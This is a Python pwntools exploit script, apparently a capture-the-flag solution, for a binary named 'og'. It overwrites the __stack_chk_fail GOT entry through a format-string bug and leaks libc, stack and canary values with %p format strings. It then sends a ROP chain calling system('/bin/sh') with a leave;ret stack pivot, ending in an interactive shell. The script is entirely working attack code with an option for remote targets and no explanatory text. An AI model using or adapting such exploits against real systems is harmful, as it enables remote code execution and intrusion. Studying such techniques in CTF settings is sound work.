from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b main
b *(go +131)
b *(go +189)
continue
'''.format(**locals())

exe = './og'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

io = start()

stack_check_got = 0x000000404018

payload = fmtstr_payload(6, {stack_check_got: elf.sym['main']})
io.sendlineafter(b"name:", payload)

payload = b"%x %x %p %x %x %x %x %x %x %x %p ".ljust(40, b"A")
io.sendlineafter(b":", payload)

pointers_leak = io.recvline().strip().split(b" ")[5:]

libc_leak = int(pointers_leak[2], 16)
canary = int(pointers_leak[-2], 16) & 0xffffffffffff0000

payload = b"%p ".ljust(40, b"A")
io.sendlineafter(b":", payload)

pointers_leak = io.recvline().strip().split(b" ")[5:]
stack_leak = int(pointers_leak[0], 16)

libc.address = libc_leak - 0x114887
buf_addr = stack_leak + 0x20d0

log.success(f"Stack leak: {hex(buf_addr)}")
log.success(f"Libc leak: {hex(libc.address)}")
log.success(f"Canario: {hex(canary)}")

ret = ROP(libc).find_gadget(["ret"]).address
leave = ROP(libc).find_gadget(["leave", "ret"]).address
pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"]).address
bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym['system']

payload = flat(
            b"B"*0x8,
            pop_rdi,
            bin_sh,
            ret,
            system
).ljust(40, b"A")
payload += flat(
                canary,
                buf_addr,
                leave
                )

io.sendlineafter(b":", payload)
io.sendlineafter(b":", b"Win!")

io.interactive()
io.close()